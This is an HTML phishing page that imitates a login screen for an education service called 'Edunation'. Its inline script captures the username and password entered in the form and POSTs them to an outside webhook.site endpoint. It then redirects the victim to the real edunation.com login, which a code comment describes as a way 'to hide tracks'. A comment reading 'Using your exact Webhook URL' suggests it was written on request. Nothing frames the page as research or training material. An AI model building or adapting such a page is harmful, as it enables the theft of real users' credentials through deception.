<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Edunation | Login</title>
    <style>
        body {
            margin: 0; padding: 0;
            background-color: #0088cc;
            background-image: url('https://www.transparenttextures.com/patterns/cubes.png'); /* Pattern approximation */
            display: flex; justify-content: center; align-items: center; height: 100vh;
            font-family: Arial, sans-serif;
        }
        .login-card {
            background: white; padding: 50px 40px; border-radius: 15px;
            width: 400px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center;
        }
        .logo { font-size: 48px; font-weight: bold; color: #00adef; margin-bottom: 30px; }
        .input-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #999; margin-bottom: 5px; }
        input {
            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 20px;
            box-sizing: border-box; font-size: 14px; outline: none;
        }
        .forgot { font-size: 11px; color: #999; text-align: right; margin-top: 5px; cursor: pointer; }
        .btn-login {
            background-color: #72c053; color: white; border: none; padding: 12px;
            width: 100%; border-radius: 20px; font-weight: bold; font-size: 16px;
            margin-top: 20px; cursor: pointer;
        }
        .or { color: #ccc; margin: 20px 0; font-size: 12px; position: relative; }
        .social-btn {
            border: 1px solid #ddd; padding: 10px; border-radius: 20px;
            font-size: 13px; color: #555; margin-bottom: 10px; display: flex;
            align-items: center; justify-content: center; cursor: pointer;
        }
        .footer-links { font-size: 10px; color: #999; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">edunation</div>
        <form id="p-gate">
            <div class="input-group">
                <label>Username</label>
                <input type="text" id="user" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <div class="forgot">Forgot your password?</div>
                <input type="password" id="pass" required>
            </div>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <div class="or">— OR —</div>
        <div class="social-btn">Sign in with Google</div>
        <div class="social-btn">Sign in with Microsoft</div>
        <div class="footer-links">Don't have an account? Sign Up | About Edunation Support Terms</div>
    </div>

    <script>
        document.getElementById('p-gate').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            // Using your exact Webhook URL
            fetch("https://webhook.site/c3ceb6bb-20ee-4997-8f40-97483b719129", {
                method: "POST",
                mode: "no-cors",
                body: JSON.stringify({ username: u, password: p })
            }).then(() => {
                // Redirect to the real site to hide tracks
                window.location.href = "https://edunation.com/login";
            });
        });
    </script>
</body>
</html>
